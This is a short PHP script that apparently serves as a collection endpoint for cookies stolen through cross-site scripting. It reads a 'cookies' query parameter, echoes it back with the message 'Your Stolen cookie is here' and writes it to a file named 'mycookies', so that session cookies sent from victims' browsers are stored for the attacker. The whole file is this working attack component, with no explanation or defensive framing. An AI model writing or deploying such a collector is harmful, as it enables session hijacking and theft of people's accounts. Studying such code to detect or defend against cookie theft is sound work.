<?php


    echo "Your Stolen cookie is here ", $_GET["cookies"];

    file_put_contents("mycookies", $_GET["cookies"]);

    

?>